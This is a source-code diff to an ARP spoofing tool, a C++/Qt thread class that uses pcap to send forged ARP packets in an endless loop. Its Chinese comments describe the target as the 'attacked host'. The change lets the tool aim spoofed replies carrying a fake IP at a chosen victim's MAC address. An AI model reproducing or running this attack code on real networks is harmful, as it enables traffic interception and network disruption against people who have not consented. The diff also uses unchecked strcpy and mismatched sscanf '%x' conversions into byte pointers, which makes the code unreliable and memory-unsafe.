@@ -5,13 +5,14 @@ ThreadARP::ThreadARP()
 
 }
 
-void ThreadARP::init(pcap_if_t *d, pcap_if_t *inalldevs, char *ip, int inop, char *dip){
+void ThreadARP::init(pcap_if_t *d, pcap_if_t *inalldevs, char *ip, int inop, char *dip, char *dmac){
     dev_if_t=d;
     alldevs=inalldevs;
     strcpy(ipaddr,ip);
     op=inop;
     if(dip){
         strcpy(dipaddr,dip);
+        strcpy(dipmac,dmac);
     }
 }
 
@@ -129,12 +130,14 @@ void ThreadARP::run(){
             dst_ip = inet_addr(dipaddr);
             if ((dst_ip & netmask) == (ip & netmask)) // 被攻击主机与本机必须处在同一网络内
             {
+                u_char dmac[100]={0};
+                sscanf(dipmac,"%x:%x:%x:%x:%x:%x",dmac,dmac+1,dmac+2,dmac+3,dmac+4,dmac+5);
                 // 无限循环, 持续发包
                 qDebug("\nsending ARP packet...");
                 for (;;)
                 {
 
-                    make_arp_packet(packet, mac, fake_ip, dst_ip,arp_op);
+                    make_arp_packet(packet, mac, fake_ip, dst_ip,arp_op,dmac);
                     if (pcap_sendpacket(adhandle, packet, sizeof(packet)) == -1) {
                         qDebug("\npacket sending error");
                     }
@@ -195,7 +198,7 @@ BOOLEAN ThreadARP::GetSelfMac(
     return bOk;
 }
 
-void ThreadARP::make_arp_packet(u_char* packet, u_char* src_mac, u_int src_ip, u_int dst_ip,quint16 op)
+void ThreadARP::make_arp_packet(u_char* packet, u_char* src_mac, u_int src_ip, u_int dst_ip,quint16 op,u_char *d_mac)
 {
     arp_packet arp_pkt;
 
@@ -203,7 +206,12 @@ void ThreadARP::make_arp_packet(u_char* packet, u_char* src_mac, u_int src_ip, u
     // 源 MAC
     memcpy(arp_pkt.eh.s_mac, src_mac, MAC_LEN);
     // 目标 MAC 地址为广播地址 FF-FF-FF-FF-FF-FF
-    memset(arp_pkt.eh.d_mac, 0xFF, MAC_LEN);
+    if(d_mac){
+        memcpy(arp_pkt.eh.d_mac, d_mac, MAC_LEN);
+
+    }else{
+        memset(arp_pkt.eh.d_mac, 0xFF, MAC_LEN);
+    }
     // 以太网上层协议为 ARP
     arp_pkt.eh.type = htons(ETHPROTOCAL_ARP);
 
